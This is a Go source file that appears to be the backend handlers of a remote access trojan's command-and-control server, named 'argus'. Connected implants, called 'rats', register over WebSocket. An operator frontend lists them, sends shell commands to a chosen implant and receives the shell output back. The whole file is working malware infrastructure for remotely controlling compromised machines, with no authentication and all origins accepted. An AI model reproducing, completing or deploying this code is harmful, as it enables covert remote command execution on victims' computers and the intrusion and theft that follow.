package handlers

import (
	"argus/backend/models"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"path/filepath"
	"sync"

	"github.com/google/uuid"
	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
	CheckOrigin: func(r *http.Request) bool {
		return true // Allow all origins for testing; restrict in production
	},
}

// Global variables
var (
	rats          = make(map[string]*models.Rat)
	ratsLock      sync.RWMutex
	frontends     = make(map[*websocket.Conn]bool)
	frontendsLock sync.RWMutex
)

func ServeFrontend(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, filepath.Join("backend", "static", "index.html"))
}

func GetRats(w http.ResponseWriter, r *http.Request) {
	ratsLock.RLock()
	defer ratsLock.RUnlock()

	data, err := json.Marshal(rats)
	if err != nil {
		http.Error(w, "Failed to serialize rats", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.Write(data)
}

func RatWebSocketHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("Rat WebSocket upgrade failed:", err)
		return
	}
	defer conn.Close()

	var initData models.Rat
	if err := conn.ReadJSON(&initData); err != nil {
		log.Println("Failed to read initial rat data:", err)
		return
	}

	ratID := uuid.New().String()
	initData.ID = ratID

	ratsLock.Lock()
	rats[ratID] = &initData
	rats[ratID].Conn = conn
	ratsLock.Unlock()

	if err := conn.WriteJSON(map[string]string{"id": ratID}); err != nil {
		log.Println("Failed to send ID to rat:", err)
		ratsLock.Lock()
		delete(rats, ratID)
		ratsLock.Unlock()
		return
	}

	log.Printf("Rat connected: %s (%s)", initData.Name, initData.ID)

	broadcastRatList()

	for {
		var msg models.Message
		if err := conn.ReadJSON(&msg); err != nil {
			log.Println("Rat WebSocket read error:", err)
			ratsLock.Lock()
			delete(rats, initData.ID)
			ratsLock.Unlock()
			broadcastRatList()
			return
		}

		log.Printf("Received from rat %s: %v", initData.ID, msg)

		switch msg.Type {
		case "shell_output":
			broadcastToFrontends(models.Message{
				Type: "shell_output",
				Data: map[string]interface{}{
					"rat_id": initData.ID,
					"output": msg.Data,
				},
			})
		}
	}
}

func FrontendWebSocketHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("Frontend WebSocket upgrade failed:", err)
		return
	}

	frontendsLock.Lock()
	frontends[conn] = true
	frontendsLock.Unlock()

	ratsLock.RLock()
	data, _ := json.Marshal(rats)
	ratsLock.RUnlock()
	conn.WriteJSON(models.Message{
		Type: "rat_list",
		Data: string(data),
	})

	log.Println("Frontend connected")

	defer func() {
		frontendsLock.Lock()
		delete(frontends, conn)
		frontendsLock.Unlock()
		conn.Close()
		log.Println("Frontend disconnected")
	}()

	for {
		var msg models.Message
		if err := conn.ReadJSON(&msg); err != nil {
			log.Println("Frontend WebSocket read error:", err)
			return
		}

		log.Printf("Received from frontend: %v", msg)

		switch msg.Type {
		case "shell_command":
			data, ok := msg.Data.(map[string]interface{})
			if !ok {
				log.Println("Invalid shell_command data")
				continue
			}
			ratID, ok := data["rat_id"].(string)
			if !ok {
				log.Println("Invalid rat_id")
				continue
			}
			command, ok := data["command"].(string)
			if !ok {
				log.Println("Invalid command")
				continue
			}
			sendToRat(ratID, models.Message{
				Type: "shell_command",
				Data: command,
			})
		}
	}
}

func sendToRat(ratID string, msg models.Message) error {
	ratsLock.RLock()
	rat, exists := rats[ratID]
	ratsLock.RUnlock()

	if !exists {
		return fmt.Errorf("rat %s not found", ratID)
	}

	return rat.Conn.WriteJSON(msg)
}

func broadcastToFrontends(msg models.Message) {
	frontendsLock.RLock()
	defer frontendsLock.RUnlock()

	for conn := range frontends {
		if err := conn.WriteJSON(msg); err != nil {
			log.Println("Error broadcasting to frontend:", err)
		}
	}
}

func broadcastRatList() {
	ratsLock.RLock()
	data, _ := json.Marshal(rats)
	ratsLock.RUnlock()

	broadcastToFrontends(models.Message{
		Type: "rat_list",
		Data: string(data),
	})
}
